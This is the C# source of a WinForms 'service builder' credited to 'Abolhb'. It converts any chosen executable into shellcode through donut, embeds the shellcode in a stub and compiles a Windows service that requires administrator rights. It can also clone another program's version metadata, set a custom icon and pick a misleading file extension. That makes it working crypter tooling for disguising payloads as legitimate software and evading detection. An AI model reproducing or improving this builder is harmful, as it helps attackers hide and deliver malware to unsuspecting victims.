using Guna.UI2.WinForms;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace MasonServiceBuilder
{
    public partial class MasonForm : Form
    {
        private byte[] sc;
        private string inPath = "";
        private string selectedIconPath = "";
        private string assmb = null;
        private string outputExtension = ".exe";

        public MasonForm()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            InitDnD();
            InitMouse();
            guna2ComboBox1.Text = ".exe";
            CopyRight.SetToolTip(pictureBox1, "Coded By Abolhb");
        }

        void InitDnD()
        {
            PathTextBox1.AllowDrop = true;
            PathTextBox1.DragEnter += PathTextBox1_DragEnter;
            PathTextBox1.DragLeave += PathTextBox1_DragLeave;
            PathTextBox1.DragDrop += PathTextBox1_DragDrop;
        }

        void InitMouse()
        {
            foreach (Control c in Controls)
            {
                if (c is Guna.UI2.WinForms.Guna2Button ||
                    c is Guna.UI2.WinForms.Guna2ControlBox ||
                    c is Guna.UI2.WinForms.Guna2CircleButton)
                    c.Cursor = Cursors.Hand;
            }
        }

        private void BuildButton1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(inPath) || !File.Exists(inPath))
            {
                MessageBox.Show("Select a valid .exe first", "Error",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string donut = Path.Combine(Application.StartupPath, "donut.dll");
            if (!File.Exists(donut))
            {
                MessageBox.Show("donut.dll not found", "Error",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            try
            {
                Cursor.Current = Cursors.WaitCursor;
                BuildButton1.Enabled = false;

                string tmp = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + ".bin");
                string args = $"-i \"{inPath}\" -o \"{tmp}\"";

                var psi = new ProcessStartInfo
                {
                    FileName = donut,
                    Arguments = args,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (var p = Process.Start(psi))
                {
                    p.WaitForExit();
                    if (p.ExitCode != 0)
                    {
                        string err = p.StandardError.ReadToEnd();
                        MessageBox.Show("Donut error:\n" + err, "Error",
                            MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                }

                sc = File.ReadAllBytes(tmp);
                if (File.Exists(tmp)) File.Delete(tmp);

                string hex = string.Join(",", sc.Select(b => "0x" + b.ToString("X2")));
                string stub = GetStub();

                string src = stub.Replace(
                    "string shellcodeString = \"shellcode\";",
                    $"string shellcodeString = \"{hex}\";"
                );

                if (!string.IsNullOrEmpty(assmb) && File.Exists(assmb) && AssemblyCheckBox1.Checked)
                {
                    try
                    {
                        var info = FileVersionInfo.GetVersionInfo(assmb);

                        string title = !string.IsNullOrEmpty(info.FileDescription) ? info.FileDescription : info.ProductName;
                        string desc = info.FileDescription;
                        string product = info.ProductName;
                        string company = info.CompanyName;
                        string copyright = info.LegalCopyright;
                        string trademark = info.LegalTrademarks;

                        Func<string, string> esc = s =>
                            string.IsNullOrEmpty(s)
                                ? ""
                                : s.Replace("\\", "\\\\").Replace("\"", "\\\"");

                        src = src
                            .Replace("%Title%", esc(title))
                            .Replace("%Des%", esc(desc))
                            .Replace("%Product%", esc(product))
                            .Replace("%Company%", esc(company))
                            .Replace("%Copyright%", esc(copyright))
                            .Replace("%Trademark%", esc(trademark));
                    }
                    catch
                    {
                    }
                }
                else
                {
                    src = StripAssemblyAttributes(src);
                }

                using (var sfd = new SaveFileDialog())
                {
                    string ext = outputExtension ?? ".exe";
                    string extNoDot = ext.StartsWith(".") ? ext.Substring(1) : ext;

                    sfd.Filter = $"Files (*{ext})|*{ext}|All files (*.*)|*.*";
                    sfd.Title = "Save service";
                    sfd.FileName = "MasonService" + ext;
                    sfd.DefaultExt = extNoDot;
                    sfd.AddExtension = true;

                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        string outPath = sfd.FileName;
                        bool ok = BuildExe(src, outPath);

                        if (ok)
                        {
                            MessageBox.Show("Service created:\n" + outPath,
                                "Done", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error:\n" + ex.Message, "Error",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                BuildButton1.Enabled = true;
                Cursor.Current = Cursors.Default;
            }
        }

        private string StripAssemblyAttributes(string src)
        {
            var lines = src.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);

            var filtered = lines.Where(line =>
            {
                var t = line.TrimStart();
                return
                    !t.StartsWith("[assembly: AssemblyTitle(") &&
                    !t.StartsWith("[assembly: AssemblyDescription(") &&
                    !t.StartsWith("[assembly: AssemblyCompany(") &&
                    !t.StartsWith("[assembly: AssemblyProduct(") &&
                    !t.StartsWith("[assembly: AssemblyCopyright(") &&
                    !t.StartsWith("[assembly: AssemblyTrademark(");
            });

            return string.Join(Environment.NewLine, filtered);
        }

        bool BuildExe(string src, string outPath = null)
        {
            string manPath = null;
            string iconPath = null;

            try
            {
                manPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + ".manifest");
                File.WriteAllText(manPath, GetMan(), Encoding.UTF8);

                var prov = new CSharpCodeProvider();
                var p = new CompilerParameters
                {
                    GenerateExecutable = true,
                    OutputAssembly = string.IsNullOrEmpty(outPath)
                       ? Path.Combine(Application.StartupPath, "MasonService" + (outputExtension ?? ".exe"))
                       : outPath,
                    IncludeDebugInformation = false,
                    TreatWarningsAsErrors = false,
                    CompilerOptions = $"/target:winexe /optimize+ /platform:x86 /win32manifest:\"{manPath}\""
                };

                if (IconCheckBox1.Checked && !string.IsNullOrEmpty(selectedIconPath) && File.Exists(selectedIconPath))
                {
                    iconPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + ".ico");
                    File.Copy(selectedIconPath, iconPath, true);
                    p.CompilerOptions += $" /win32icon:\"{iconPath}\"";
                }

                p.ReferencedAssemblies.Add("System.dll");
                p.ReferencedAssemblies.Add("System.ServiceProcess.dll");
                p.ReferencedAssemblies.Add("System.Core.dll");

                CompilerResults r = prov.CompileAssemblyFromSource(p, src);

                if (r.Errors.HasErrors)
                {
                    var sb = new StringBuilder();
                    sb.AppendLine("Compile errors:");
                    foreach (CompilerError err in r.Errors)
                        sb.AppendLine($"Line {err.Line}: {err.ErrorText}");

                    MessageBox.Show(sb.ToString(), "Compile",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return false;
                }

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show("Compile failed:\n" + ex.Message, "Error",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
            finally
            {
                try
                {
                    if (!string.IsNullOrEmpty(manPath) && File.Exists(manPath))
                        File.Delete(manPath);

                    if (!string.IsNullOrEmpty(iconPath) && File.Exists(iconPath))
                        File.Delete(iconPath);
                }
                catch { }
            }
        }

        string GetMan()
        {
            return
@"<?xml version=""1.0"" encoding=""utf-8""?>
<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">
  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v3"">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level=""requireAdministrator"" uiAccess=""false"" />
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns=""urn:schemas-microsoft-com:compatibility.v1"">
    <application>
      <supportedOS Id=""{e2011457-1546-43c5-a5fe-008deee3d3f0}"" />
      <supportedOS Id=""{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"" />
      <supportedOS Id=""{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"" />
      <supportedOS Id=""{1f676c76-80e1-4239-95bb-83d0f6d0da78}"" />
      <supportedOS Id=""{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"" />
    </application>
  </compatibility>
</assembly>";
        }

        string GetStub()
        {
            try { return Properties.Resources.Stub ?? ""; }
            catch { return ""; }
        }

        private void MainPanel_Paint(object sender, PaintEventArgs e)
        {
          
        }

        private void PathTextBox1_TextChanged_1(object sender, EventArgs e)
        {
            
        }

        private void guna2Panel3_Paint(object sender, PaintEventArgs e)
        {
            
        }

        private void CloseButton_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.youtube.com/@ABOLHB");
        }

        private void PathTextBox1_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                e.Effect = DragDropEffects.Copy;
                PathTextBox1.BorderColor = Color.FromArgb(180, 100, 255);
                PathTextBox1.FillColor = Color.FromArgb(40, 0, 70);
            }
            else e.Effect = DragDropEffects.None;
        }

        private void PathTextBox1_DragLeave(object sender, EventArgs e)
        {
            PathTextBox1.BorderColor = Color.FromArgb(60, 0, 100);
            PathTextBox1.FillColor = Color.FromArgb(30, 0, 50);
        }

        private void PathTextBox1_DragDrop(object sender, DragEventArgs e)
        {
            var files = (string[])e.Data.GetData(DataFormats.FileDrop);
            if (files != null && files.Length > 0)
            {
                string f = files[0];
                if (Path.GetExtension(f).ToLower() == ".exe")
                {
                    inPath = f;
                    PathTextBox1.Text = inPath;
                }
            }

            PathTextBox1.BorderColor = Color.FromArgb(60, 0, 100);
            PathTextBox1.FillColor = Color.FromArgb(30, 0, 50);
        }

        private void guna2Panel4_Paint(object sender, PaintEventArgs e)
        {

        }

        private void PathTextBox1_TextChanged(object sender, EventArgs e)
        {
            inPath = PathTextBox1.Text;
        }

        private void SelectButton_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*";
                ofd.Title = "Select file";

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    inPath = ofd.FileName;
                    PathTextBox1.Text = inPath;
                }
            }
        }

        private void IconCheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (IconCheckBox1.Checked)
            {
                using (OpenFileDialog ofd = new OpenFileDialog())
                {
                    ofd.Filter = "Icon files (*.ico)|*.ico|All files (*.*)|*.*";
                    ofd.Title = "Select icon file";

                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        selectedIconPath = ofd.FileName;

                        try
                        {
                            if (pictureBox2.Image != null)
                                pictureBox2.Image.Dispose();

                            pictureBox2.Image = Image.FromFile(selectedIconPath);
                            pictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
                        }
                        catch { }
                    }
                    else
                    {
                        IconCheckBox1.Checked = false;
                        selectedIconPath = "";
                        if (pictureBox2.Image != null)
                        {
                            pictureBox2.Image.Dispose();
                            pictureBox2.Image = null;
                        }
                    }
                }
            }
            else
            {
                selectedIconPath = "";
                if (pictureBox2.Image != null)
                {
                    pictureBox2.Image.Dispose();
                    pictureBox2.Image = null;
                }
            }
        }


        private void pictureBox2_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(selectedIconPath) && File.Exists(selectedIconPath))
            {
                try
                {
                    if (pictureBox2.Image != null)
                        pictureBox2.Image.Dispose();

                    pictureBox2.Image = Image.FromFile(selectedIconPath);
                    pictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
                }
                catch { }
            }
            else
            {
            }
        }

        private void AssemblyCheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (AssemblyCheckBox1.Checked)
            {
                using (var ofd = new OpenFileDialog())
                {
                    ofd.Title = "Select File";
                    ofd.Filter = "Executable files (*.exe)|*.exe";

                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        assmb = ofd.FileName;

                        try
                        {
                            var info = FileVersionInfo.GetVersionInfo(assmb);

                            string name = !string.IsNullOrEmpty(info.ProductName)
                                ? info.ProductName
                                : Path.GetFileNameWithoutExtension(assmb);

                            if (name.Length > 12)
                                name = name.Substring(0, 23) + "...";

                            AppNamelabel.Text = name;
                        }
                        catch
                        {
                            string fallback = Path.GetFileNameWithoutExtension(assmb);

                            if (fallback.Length > 12)
                                fallback = fallback.Substring(0, 23) + "...";

                            AppNamelabel.Text = fallback;
                        }
                    }
                    else
                    {
                        assmb = null;
                        AssemblyCheckBox1.Checked = false;
                        AppNamelabel.Text = "";
                    }
                }
            }
            else
            {
                assmb = null;
                AssemblyCheckBox1.Checked = false;
                AppNamelabel.Text = "";
            }
        }



        private void AppNamelabel_Click(object sender, EventArgs e)
        {

        }

        private void guna2ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (guna2ComboBox1.SelectedItem == null)
            {
                outputExtension = ".exe";
                guna2ComboBox1.Text = ".exe";
                return;
            }
            string ext = guna2ComboBox1.SelectedItem.ToString().Trim();
            if (!ext.StartsWith("."))
                ext = "." + ext;
            outputExtension = ext;
            guna2ComboBox1.Text = ext;
        }


        private void CopyRight_Popup(object sender, PopupEventArgs e)
        {

        }
    }
}
